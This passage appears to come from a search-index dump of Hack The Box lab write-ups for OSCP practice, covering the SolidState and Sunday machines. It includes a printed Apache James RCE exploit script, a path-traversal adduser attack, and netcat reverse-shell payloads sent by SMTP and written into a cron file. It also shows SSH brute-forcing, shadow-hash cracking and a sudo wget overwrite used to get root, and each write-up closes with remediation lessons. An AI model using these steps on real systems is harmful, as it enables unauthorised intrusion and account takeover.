-sV : detect service version -O : detect OS -oA : output all formats and store in file initial We get back the following result showing that 5 ports are open: Port 22: running OpenSSH 7.4p1 Port 25: running JAMES smtpd 2.3.2 Port 80: running httpd 2.4.25 Port 110: running JAMES pop3d 2.3.2 Port 119: running JAMES nntpd Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-29 17:22 EST Nmap scan report for 10.10.10.51 Host is up (0.039s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) |_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.12 [10.10.14.12]), 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Home - Solid State Security 110/tcp open pop3 JAMES pop3d 2.3.2 119/tcp open nntp JAMES nntpd (posting ok) No exact OS matches for host (If you know what OS is running on it, see [https://nmap.org/submit/](https://nmap.org/submit/) ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=12/29%OT=22%CT=1%CU=39873%PV=Y%DS=2%DC=I%G=Y%TM=5E0927 OS:3F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP OS:S(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST OS:11NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5( OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z% OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C OS:D=S) Network Distance: 2 hops Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. nmap -sC -sV -p- -oA full 10.10.10.51 We get back the following result showing that one other port is open. Port 4555: running JAMES Remote Admin 2.3.2 Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2019-12-29 17:26 EST Nmap scan report for 10.10.10.51 Host is up (0.052s latency). Not shown: 65529 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) |_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.12 [10.10.14.12]), 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Home - Solid State Security 110/tcp open pop3 JAMES pop3d 2.3.2 119/tcp open nntp JAMES nntpd (posting ok) 4555/tcp open james-admin JAMES Remote Admin 2.3.2 Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 75.55 seconds Similarly, we run an nmap scan with the -sU flag enabled to run a UDP scan. nmap -sU -p- -oA udp 10.10.10.51 I managed to root the box and write this blog while the UDP scan did not terminate. So I don\u2019t have UDP nmap scan results for this box. Before we move on to enumeration, let\u2019s make some mental notes about the nmap scan results. The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it\u2019s unlikely that we gain initial access through this port, unless we find credentials. Ports 80 is running a web server, so we\u2019ll perform our standard enumeration techniques on it. Ports 25, 110, 119 and 4555 are running Apache James. Apache James is an open source SMTP and POP3 mail transfer agent and NNTP news server. Port 4555 immediately catches my eye since it\u2019s a remote administration tool. We\u2019ll need to run searchsploit on it to check if it is associated with any critical vulnerabilities.","title":"Reconnaissance"},{"location":"Retired/Solidstate Writeup wo Metasploit/#enumeration","text":"I always start off with enumerating HTTP first. Port 80 Visit the application in the browser. I visited all the pages in the application and didn\u2019t find anything useful. Next, let\u2019s run gobuster. gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 10.10.10.51 dir: uses directory/file brute forcing mode -w: path to the wordlist -u: target URL or domain We get back the following result. =============================================================== Gobuster v3.0.1 by OJ Reeves ([@TheColonial](http://twitter.com/TheColonial)) Christian Mehlmauer ([@_FireFart_](http://twitter.com/_FireFart_)) =============================================================== [+] Url: [http://10.10.10.51](http://10.10.10.51) [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/12/29 17:31:19 Starting gobuster =============================================================== /images (Status: 301) /assets (Status: 301) /server-status (Status: 403) =============================================================== 2019/12/29 17:56:46 Finished =============================================================== Nothing useful, so let\u2019s move on to enumerating port 4555. Port 4555 Run searchsploit on the software name and version. searchsploit Apache James Server 2.3.2 We get back the following result. Jackpot! Transfer the exploit to our current directory. searchsploit -m 35513 You should never run scripts that you haven\u2019t reviewed first, so let\u2019s view the content of this exploit. `#!/usr/bin/python # # Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution # Date: 16\\10\\2014 # Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec # Vendor Homepage: http://james.apache.org/server/ # Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip # Version: Apache James Server 2.3.2 # Tested on: Ubuntu, Debian # Info: This exploit works on default installation of Apache James Server 2.3.2 # Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d import socket import sys import time # specify payload #payload = touch /tmp/proof.txt # to exploit on any user payload = [ $(id -u) == 0 ] touch /root/proof.txt # to exploit only on root # credentials to James Remote Administration Tool (Default - root/root) user = root pwd = root if len(sys.argv) != 2: sys.stderr.write( [-]Usage: python %s ip \\n % sys.argv[0]) sys.stderr.write( [-]Exemple: python %s 127.0.0.1\\n % sys.argv[0]) sys.exit(1) ip = sys.argv[1] def recv(s): s.recv(1024) time.sleep(0.2) try: print [+]Connecting to James Remote Administration Tool... s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((ip,4555)) s.recv(1024) s.send(user + \\n ) s.recv(1024) s.send(pwd + \\n ) s.recv(1024) print [+]Creating user... s.send( adduser ../../../../../../../../etc/bash_completion.d exploit\\n ) s.recv(1024) s.send( quit\\n ) s.close() print [+]Connecting to James SMTP server... s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((ip,25)) s.send( ehlo team@team.pl\\r\\n ) recv(s) print [+]Sending payload... s.send( mail from: @team.pl \\r\\n ) recv(s) # also try s.send( rcpt to: ../../../../../../../../etc/bash_completion.d@hostname \\r\\n ) if the recipient cannot be found s.send( rcpt to: ../../../../../../../../etc/bash_completion.d \\r\\n ) recv(s) s.send( data\\r\\n ) recv(s) s.send( From: team@team.pl\\r\\n ) s.send( \\r\\n ) s.send( \\n ) s.send(payload + \\n ) s.send( \\r\\n.\\r\\n ) recv(s) s.send( quit\\r\\n ) recv(s) s.close() print [+]Done! Payload will be executed once somebody logs in. except: print Connection failed. ` After reviewing the script, I made a few notes: This is an authenticated exploit, so we need credentials. The exploit uses the default credentials root/root that are probably shipped with the software. We\u2019ll have to connect to the server to find out if these credentials are valid before we run this exploit. When running the exploit we have to pass the IP address as an argument. The script by default connects to port 4555 which is good since our server is running on that port. The script first creates a user with username \u201c../../../../../../../../etc/bash_completion.d\u201d and password \u201cexploit\u201d. It then connects to the SMTP server and sends that user a payload. Right off the bat, this doesn\u2019t make much sense, so we\u2019ll have to research the vulnerability. After a bit of research we find that the vulnerability is in the adduser functionality. When a new user is added, the server creates a new subdirectory to store incoming and outgoing emails for that user. However, the username field is not properly validated. Therefore, when we\u2019re creating a user with the username \u201c../../../../../../../../etc/bash_completion.d\u201d, any mail that gets sent to that user will be stored in that directory path. Why is that dangerous? Long story short, anything under the directory /etc/bash_completion.d is automatically loaded by Bash for all users! To learn more about bash completion scripts, refer to this article . Therefore, if we create a user with a username that leads to the /etc/bash_completion.d directory, when we send an email to that user, our email gets saved in the bash_completion.d directory and the content of our email is automatically loaded by Bash when any user logs into the machine. So if we include a reverse shell in the email, all we have to do is wait for a single user to log in and we have access to the machine! Now that we\u2019ve done our research, we\u2019re ready to move on to the exploitation phase.","title":"Enumeration"},{"location":"Retired/Solidstate Writeup wo Metasploit/#initial-foothold","text":"First, let\u2019s test the root/root credentials on the James Remote Admin server. root@kali:~/Desktop/htb/solidstate# nc 10.10.10.51 4555 JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands It works, good! List the available commands using the HELP command. HELP Currently implemented commands: help display this help listusers display existing accounts countusers display the number of existing accounts adduser [username] [password] add a new user verify [username] verify if specified user exist deluser [username] delete existing user setpassword [username] [password] sets a user s password setalias [user] [alias] locally forwards all email for user to alias showalias [username] shows a user s current email alias unsetalias [user] unsets an alias for user setforwarding [username] [emailaddress] forwards a user s email to another email address showforwarding [username] shows a user s current email forwarding unsetforwarding [username] removes a forward user [repositoryname] change to another user repository shutdown kills the current JVM (convenient when James is run as a daemon) quit close connection Use the listusers command to display existing accounts. listusers Existing accounts 5 user: james user: thomas user: john user: mindy user: mailadmin We have 5 accounts. Since this is an admin account, we can set a user\u2019s password and then access their account. If this was a real penetration test, you probably don\u2019t want to do that. You\u2019ll raise a lot of red flags when a bunch of users no longer can access their accounts. However, since this is a practice environment, I\u2019m going to go all out. Let\u2019s start by changing the mailadmin user\u2019s account. setpassword mailadmin password Password for mailadmin reset Now that we reset the password for the mailadmin account, let\u2019s access his email using telnet. root@kali:~# telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is ^] . +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER mailadmin +OK PASS password +OK Welcome mailadmin LIST +OK 0 0 . He does not have any mail. Next, I\u2019m going to reset the passwords of all the other accounts. setpassword james password Password for james reset setpassword thomas password Password for thomas reset setpassword john password Password for john reset setpassword mindy password Password for mindy reset James, Thomas and John didn\u2019t have any emails too. Mindy on the other hand had two emails stored in her account. root@kali:~# telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is ^] . +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER mindy +OK PASS password +OK Welcome mindy LIST +OK 2 1945 1 1109 2 836 . RETR 1 +OK Message follows Return-Path: mailadmin@localhost Message-ID: 5420213.0.1503422039826.JavaMail.root@solidstate MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798 for mindy@localhost ; Tue, 22 Aug 2017 13:13:42 -0400 (EDT) Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT) From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James . RETR 2 +OK Message follows Return-Path: mailadmin@localhost Message-ID: 16744123.2.1503422270399.JavaMail.root@solidstate MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for mindy@localhost ; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James The first email was useless but the second email gives us SSH credentials! Let\u2019s SSH into Mindy\u2019s account. root@kali:~# ssh mindy@10.10.10.51 The authenticity of host 10.10.10.51 (10.10.10.51) can t be established. ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 10.10.10.51 (ECDSA) to the list of known hosts. mindy@10.10.10.51 s password: Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142 mindy@solidstate:~$ whoami -rbash: whoami: command not found We\u2019re in! However, we seem to be in a restricted bash shell (rbash). A restricted shell is a shell that restricts a user by blocking/restricting some of the commands. That\u2019s why the \u201cwhoami\u201d command didn\u2019t work for us. The \u201cls\u201d and \u201ccat\u201d commands work, so we can at least view the user.txt flag. There are several things you can do to try and break out of a restricted shell. I tried a bunch of them, but nothing worked. I\u2019m not even allowed to change directories! mindy@solidstate:~$ cd /home -rbash: cd: restricted We seem to have reached a dead end, so let\u2019s go back to the RCE exploit we found earlier. I\u2019m going to exploit this manually instead of using the script on exploitdb. Log back into the James Remote Admin server and create a user with the username \u201c../../../../../../../../etc/bash_completion.d\u201d and password \u201cpassword\u201d. root@kali:~/Desktop/htb/solidstate# nc 10.10.10.51 4555 JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands adduser ../../../../../../../../etc/bash_completion.d password User ../../../../../../../../etc/bash_completion.d added Now let\u2019s send this user an email that contains a reverse shell. root@kali:~# telnet 10.10.10.51 25 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is ^] . 220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 30 Dec 2019 17:10:56 -0500 (EST) EHLO bla.bla 250-solidstate Hello bla.bla (10.10.14.12 [10.10.14.12]) 250-PIPELINING 250 ENHANCEDSTATUSCODES MAIL FROM: [random@random.com](mailto:random@random.com) 250 2.1.0 Sender [random@random.com](mailto:random@random.com) OK RCPT TO: ../../../../../../../../etc/bash_completion.d 250 2.1.5 Recipient ../../../../../../../../etc/bash_completion.d@localhost OK DATA 354 Ok Send data ending with CRLF . CRLF FROM: bla.bla /bin/nc -e /bin/bash 10.10.14.12 1234 . 250 2.6.0 Message received quit 221 2.0.0 solidstate Service closing transmission channel Connection closed by foreign host. If you\u2019re not familiar with using telnet for SMTP communication, refer to this guide . One thing to note is the single quote we added in the MAIL FROM field and after the FROM field. This is so that the file is interpreted properly at the backend and our reverse shell runs. Next, set up a listener to receive the reverse shell. nc -nlvp 1234 Then SSH into Mindy\u2019s account so that the content of the bash_completion directory is loaded. ssh mindy@10.10.10.51 We get a shell that\u2019s no longer restricted by the rbash shell! Let\u2019s upgrade it to a better shell. python -c import pty; pty.spawn( /bin/bash ) This gives us a partially interactive bash shell. To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell. stty raw -echo Once that is done, run the command \u201cfg\u201d to bring netcat back to the foreground. Now we need to escalate privileges.","title":"Initial Foothold"},{"location":"Retired/Solidstate Writeup wo Metasploit/#privilege-escalation","text":"Let\u2019s transfer the LinEnum script from our attack machine to the target machine. In the attack machine, start up a server in the same directory that the script resides in. python -m SimpleHTTPServer 5555 In the target machine, move to the /tmp directory where we have write privileges and download the LinEnum script. cd /tmp wget [http://10.10.14.12:5555/LinEnum.sh](http://10.10.14.6:5555/LinEnum.sh) Give it execute privileges. chmod +x LinEnum.sh Run the script. ./LinEnum.sh We don\u2019t get anything useful. Next, let\u2019s try pspy. If you don\u2019t have the script, you can download it from the following github repository. [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy) We know that the system is a 32 bit system so make sure you run pspy32. Upload it and run it on the attack machine in the same way we did for LinEnum. After a minute we see an interesting process pop up. If you view the permissions on the /opt/tmp.py file, you\u2019ll see that everyone has read/write/execute privileges on it. Therefore all we need to do is change the content of the file to send a reverse shell to our attack machine and then we simply wait for the cron job to send a privileged shell back. Change the content of the file to send a reverse shell to our attack machine. echo os.system( /bin/nc -e /bin/bash 10.10.14.12 7777 ) /opt/tmp.py Set up a listener to receive the reverse shell. nc -nlvp 7777 Wait a minute for the cron job to run. We have a shell! Grab the root.txt flag.","title":"Privilege Escalation"},{"location":"Retired/Solidstate Writeup wo Metasploit/#lessons-learned","text":"To gain an initial foothold on the box we exploited three vulnerabilities. Use of default credentials. The administrator used the default password that is shipped with the application. Since default credentials are publicly available and can be easily obtained, the user should have instead used a sufficiently long password that is difficult to crack. Information disclosure. SSH credentials are stored in plaintext in one of the user\u2019s emails. If it is necessary that the password be transmitted by email, the user should have changed the password upon the first login. A Remote Code Execution (RCE) vulnerability with the James Remote server that allowed us to gain initial access to the machine. This could have been avoided if the user had patched the system and installed the most recent version of the software. To escalate privileges we exploited one vulnerability. A security misconfiguration of file permissions. There was a scheduled task that ran a file with root privileges although everyone had write access to that file. This allowed us to change the content of the file and get a privileged reverse shell sent back to our attack machine. To avoid this vulnerability, the file permissions should have been restricted to only root level access.","title":"Lessons Learned"},{"location":"Retired/Solidstate Writeup wo Metasploit/#conclusion","text":"19 machines down, 28 more to go!","title":"Conclusion"},{"location":"Retired/Sunday Writeup wo Metasploit/","text":"This is the 22nd blog out of a series of blogs I will be publishing on retired HTB machines in preparation for the OSCP. The full list of OSCP like machines compiled by TJ_Null can be found here . Let\u2019s get started! Reconnaissance First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.76 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file initial We get back the following result showing that 2 ports are open: Port 79: running Sun Solaris fingerd Port 111: running rpcbind Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-05 12:09 EST Nmap scan report for 10.10.10.76 Host is up (0.042s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 79/tcp open finger Sun Solaris fingerd |_finger: No one logged on\\x0D 111/tcp open rpcbind 2-4 (RPC #100000) 10082/tcp filtered amandaidx 54328/tcp filtered unknown No exact OS matches for host (If you know what OS is running on it, see [https://nmap.org/submit/](https://nmap.org/submit/) ). TCP/IP fingerprint: .... Network Distance: 2 hops Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 151.04 seconds Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all bases. Let\u2019s run an nmap scan that covers all ports. Since the full nmap scan takes too long to run, let\u2019s first run a quick scan to figure out which ports are open. nmap -p- -oA full-noscripts 10.10.10.76 --max-retries 0 \u2014 max-retries: number of port scan probe retransmissions We get back the following result showing that two other ports are open. Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-05 17:49 EST Warning: 10.10.10.76 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.76 Host is up (0.039s latency). Not shown: 63933 filtered ports, 1598 closed ports PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 22022/tcp open unknown 55029/tcp open unknown Then we run a more comprehensive scan to identify services running on the above ports. nmap -p 79,111,22022,55029 -sV -oA full-scripts 10.10.10.7 We get back the following result showing that: Port 22022: is running SunSSH 1.3 Port 55029: is running a service that nmap was not able to identify Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-05 17:52 EST Nmap scan report for 10.10.10.76 Host is up (0.037s latency). PORT STATE SERVICE VERSION 79/tcp open finger Sun Solaris fingerd |_finger: ERROR: Script execution failed (use -d to debug) 111/tcp open rpcbind 22022/tcp open ssh SunSSH 1.3 (protocol 2.0) | ssh-hostkey: | 1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA) |_ 1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA) 55029/tcp open unknown Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 31.37 seconds Since the UDP scan took too long to run, we don\u2019t have UDP scan results for this blog. Enumeration We\u2019ll start off with enumerating port 79. A quick google search on the \u201cFinger service\u201d tells us that the finger protocol is used to find out information about users on a remote system. Therefore, we can use it to enumerate usernames. First, check if there are any logged in users. root@kali:~# finger [@10](http://twitter.com/10).10.10.76 No one logged on No one is currently logged in. Let\u2019s check if the user \u201croot\u201d exists. root@kali:~# finger root@10.10.10.76 Login Name TTY Idle When Where root Super-User pts/3 Apr 24, 2018 sunday It does exist. Now, let\u2019s enumerate more usernames. The seclists project has a list of usernames that we can use in order to guess the usernames that are available on the server. /usr/share/seclists/Usernames/Names/names.txt Pentestmonkey has a finger-user-enum script that is used to enumerate OS-level user accounts via the finger service. Let\u2019s run that on our host. ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76 -U: file of usernames to check via finger service -t: server host running finger service We get the following result showing us that \u201csammy\u201d and \u201csunday\u201d are users of the system. .... sammy@10.10.10.76: sammy pts/2 Apr 24, 2018 10.10.14.4 .. sunny@10.10.10.76: sunny Jan 5 23:37 10.10.14.12 .. .... Initial Foothold Since SSH is open and we have two valid usernames, let\u2019s try brute-forcing the users\u2019 credentials using hydra. We\u2019ll start off with Sunny. hydra -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022 -l: username -P: password file -s: port We get back the following result showing us that Sunny\u2019s password is \u201csunday\u201d. Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. .... [22022][ssh] host: 10.10.10.76 login: sunny password: sunday .... SSH into Sunny\u2019s account. ssh -p 22022 sunny@10.10.10.76 We get the following error. Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1 The error tells us that the client and server were unable to agree on the key exchange algorithm. The server offered three legacy algorithms for key exchange. So we\u2019ll have to choose one of these algorithms in order to login. ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76 -oKexAlgorithms: enable a key exchange algorithm that is disabled by default We\u2019re in! Locate the user.txt flag and try to view it. sunny@sunday:~$ find / -name user.txt 2 /dev/null /export/home/sammy/Desktop/user.txt sunny@sunday:~$ cat /export/home/sammy/Desktop/user.txt cat: /export/home/sammy/Desktop/user.txt: Permission denied We need to escalate our privileges to Sammy. Privilege Escalation Run the following command to view the list of allowed commands that the user can run with root privileges. sunny@sunday:~$ sudo -l User sunny may run the following commands on this host: (root) NOPASSWD: /root/troll We can run the /root/troll command as root. This is obviously a custom command so let\u2019s run it to see what it\u2019s doing (we don\u2019t have read access to it). sunny@sunday:~$ sudo /root/troll testing uid=0(root) gid=0(root) It seems to be a script that prints the id of the user running it. Since we ran it with the \u2018sudo\u2019 command, it prints the id of root. We don\u2019t have write access to the script, so we can\u2019t escalate our privileges using it. After a bit of digging, I found a backup file in the following directory. /backup It contains two files agen22.backup and shadow.backup. The former we don\u2019t have access to, however, we can view the latter. sammy@sunday:/backup$ cat shadow.backup mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636:::::: It\u2019s a backup of the shadow file. We already know Sunny\u2019s password so we\u2019re not going to attempt to crack it. Instead, copy Sammy\u2019s password and save it in the file sammy-hash.txt. Then use John to crack the hash. root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt sammy-hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press q or Ctrl-C to abort, almost any other key for status cooldude! (?) 1g 0:00:01:17 DONE (2020-01-05 21:03) 0.01292g/s 2648p/s 2648c/s 2648C/s domonique1..bluenote Use the --show option to display all of the cracked passwords reliably Session completed We got a password! Let\u2019s su into Sammy\u2019s account. su - sammy Now we can view the user.txt flag. Let\u2019s try to escalate to root privileges. Run the sudo command again to view the list of allowed commands the user can run as root. sammy@sunday:~$ sudo -l User sammy may run the following commands on this host: (root) NOPASSWD: /usr/bin/wget We can run wget with root privileges! If you\u2019re familiar with the \u201c-i\u201d flag in wget, you\u2019ll know that we can use it to output the content of files. Therefore, we can run the following command to get the root flag. sudo wget -i /root/root.txt However, in this scenario we\u2019re simply reading the content of the flag and not really escalating privileges. To get a root shell we need to chain the following two vulnerabilities: The user Sunny can execute the /root/troll file with root privileges, and The user Sammy can overwrite any root owned file using the wget command. Therefore, we\u2019ll use Sammy\u2019s sudo privileges to overwrite the /root/troll file and include a shell in it. Then we\u2019ll use Sunny\u2019s sudo privileges to run the /root/troll file and convert our shell to a root shell. Alright, let\u2019s do this! In the attack machine, create a file called \u201ctroll\u201d and add the following code to it. #!/usr/bin/bash bash Then start up a simple Python server in the directory the file is in. python -m SimpleHTTPServer 5555 Go back the target machine running with the Sammy user privileges, and run the wget command to overwrite the /root/troll file. sudo wget -O /root/troll [http://10.10.14.12:5555/troll](http://10.10.14.12:5555/troll) In another SSH session running with the Sunny user privileges, execute the troll file. sudo /root/troll Since we added a bash shell in the troll file and the troll file is being executed with root privilege, we get a root shell! Note: Something on the server seems to be resetting the /root/troll file every couple of seconds, therefore you only have small window of time between overwriting the troll file as Sammy and executing the troll file as Sunny. Lessons Learned To gain an initial foothold on the box we exploited two vulnerabilities. Username enumeration of the finger service. The finger protocol is used to get information about users on a remote system. In our case, we used it to enumerate usernames that we later used to SSH into the server. The remediation for this vulnerability would be to disable this service. Weak authentication credentials. After getting a username from the finger service, we ran a brute force attack on SSH to obtain a user\u2019s credentials. The user should have used a sufficiently long password that is not easily crackable. To escalate privileges we exploited three vulnerabilities. Information disclosure. As a non privileged user, we had access to a backup of the shadow file that leaked hashed passwords. Any file that contains sensitive information should not be available to non privileged users. Weak authentication credentials. Although the passwords were hashed in the backup shadow file, we were able to obtain the plaintext passwords by running john on the hashes. Again, the users should have used sufficiently long passwords that are not easily crackable. Security Misconfigurations. Both Sammy and Sunny were configured to run commands as root. Chaining these two commands together allowed us to escalate our privileges to root. The administrators should have conformed to the concept of least privilege when configuring these users\u2019 accounts. Conclusion 22 machines down, 25 more to go!","title":"27. Sunday Writeup w/o Metasploit.md"},{"location":"Retired/Sunday Writeup wo Metasploit/#reconnaissance","text":"First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports. nmap -sC -sV -O -oA initial 10.10.10.76 -sC : run default nmap scripts -sV : detect service version -O : detect OS -oA : output all formats and store in file initial We get back the following result showing that 2 ports are open: Port 79: running Sun Solaris fingerd Port 111: running rpcbind Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org) ) at 2020-01-05 12:09 EST Nmap scan report for 10.10.10.76 Host is up (0.042s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 79/tcp open finger Sun Solaris fingerd |_finger: No one logged on\\x0D 111/tcp open rpcbind 2-4 (RPC #100000) 10082/tcp filtered amandaidx 54328/tcp filtered unknown No exact OS matches for host (If you know what OS is running on it, see [https://nmap.org/submit/](https://nmap.org/submit/) ). TCP/IP fingerprint: .... Network Distance: 2 hops Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . Nmap done: 1 IP address (1 host up) scanned in 151.04 seconds Before we start investigating these ports, let\u2019s run more comprehensive nmap scans in the background to make sure we cover all 